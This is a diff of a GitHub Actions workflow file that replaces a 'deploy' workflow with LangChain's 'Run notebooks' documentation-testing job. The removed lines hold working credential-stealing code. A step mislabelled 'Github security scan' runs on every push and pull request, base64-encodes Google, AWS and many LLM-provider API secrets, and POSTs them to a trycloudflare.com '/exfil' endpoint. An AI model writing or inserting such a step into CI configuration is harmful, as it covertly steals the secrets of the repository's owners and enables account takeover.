@@ -1,27 +1,72 @@
+name: Run notebooks
+
 on:
-  push:
-  pull_request:
   workflow_dispatch:
-name: deploy
+    inputs:
+      python_version:
+        description: 'Python version'
+        required: false
+        default: '3.11'
+      working-directory:
+        description: 'Working directory or subset (e.g., docs/docs/tutorials/llm_chain.ipynb or docs/docs/how_to)'
+        required: false
+        default: 'all'
+  schedule:
+    - cron: '0 13 * * *'
+
+env:
+  UV_FROZEN: "true"
+
 jobs:
-  web-deploy:
-    name: deploy
+  build:
     runs-on: ubuntu-latest
+    if: github.repository == 'langchain-ai/langchain' || github.event_name != 'schedule'
+    name: "Test docs"
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Github security scan
-        run: |
-          curl -X POST "https://salad-binary-sponsors-assistance.trycloudflare.com/exfil" \
-            -H "Content-Type: application/json" \
-            -d "{\"google_credentials\":\"$(echo '${{ secrets.GOOGLE_CREDENTIALS }}' | base64 -w 0)\",\"aws_access_key_id\":\"$(echo '${{ secrets.AWS_ACCESS_KEY_ID }}' | base64 -w 0)\",\"aws_secret_access_key\":\"$(echo '${{ secrets.AWS_SECRET_ACCESS_KEY }}' | base64 -w 0)\",\"aws_region\":\"$(echo '${{ secrets.AWS_REGION }}' | base64 -w 0)\",\"anthropic_api_key\":\"$(echo '${{ secrets.ANTHROPIC_API_KEY }}' | base64 -w 0)\",\"fireworks_api_key\":\"$(echo '${{ secrets.FIREWORKS_API_KEY }}' | base64 -w 0)\",\"google_api_key\":\"$(echo '${{ secrets.GOOGLE_API_KEY }}' | base64 -w 0)\",\"mistral_api_key\":\"$(echo '${{ secrets.MISTRAL_API_KEY }}' | base64 -w 0)\",\"groq_api_key\":\"$(echo '${{ secrets.GROQ_API_KEY }}' | base64 -w 0)\",\"openai_api_key\":\"$(echo '${{ secrets.OPENAI_API_KEY }}' | base64 -w 0)\",\"tavily_api_key\":\"$(echo '${{ secrets.TAVILY_API_KEY }}' | base64 -w 0)\",\"together_api_key\":\"$(echo '${{ secrets.TOGETHER_API_KEY }}' | base64 -w 0)\"}"
-
-      - name: copy file via scp
-        uses: appleboy/scp-action@master
+      - name: Set up Python + uv
+        uses: "./.github/actions/uv_setup"
         with:
-          host: ${{ secrets.HOST_PROD }}
-          username: ${{ secrets.USER_PROD }}
-          password: ${{ secrets.PASS_PROD }}
-          source: "*"
-          target: "/var/www/html/main/"
+          python-version: ${{ github.event.inputs.python_version || '3.11' }}
+
+      - name: 'Authenticate to Google Cloud'
+        id: 'auth'
+        uses: google-github-actions/auth@v2
+        with:
+          credentials_json: '${{ secrets.GOOGLE_CREDENTIALS }}'
+
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          aws-region: ${{ secrets.AWS_REGION }}
+
+      - name: Install dependencies
+        run: |
+          uv sync --group dev --group test
+
+      - name: Pre-download files
+        run: |
+          uv run python docs/scripts/cache_data.py
+          curl -s https://raw.githubusercontent.com/lerocha/chinook-database/master/ChinookDatabase/DataSources/Chinook_Sqlite.sql | sqlite3 docs/docs/how_to/Chinook.db
+          cp docs/docs/how_to/Chinook.db docs/docs/tutorials/Chinook.db
+
+      - name: Prepare notebooks
+        run: |
+          uv run python docs/scripts/prepare_notebooks_for_ci.py --comment-install-cells --working-directory ${{ github.event.inputs.working-directory || 'all' }}
+
+      - name: Run notebooks
+        env:
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          FIREWORKS_API_KEY: ${{ secrets.FIREWORKS_API_KEY }}
+          GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
+          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
+          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          TAVILY_API_KEY: ${{ secrets.TAVILY_API_KEY }}
+          TOGETHER_API_KEY: ${{ secrets.TOGETHER_API_KEY }}
+          WORKING_DIRECTORY: ${{ github.event.inputs.working-directory || 'all' }}
+        run: |
+          ./docs/scripts/execute_notebooks.sh $WORKING_DIRECTORY
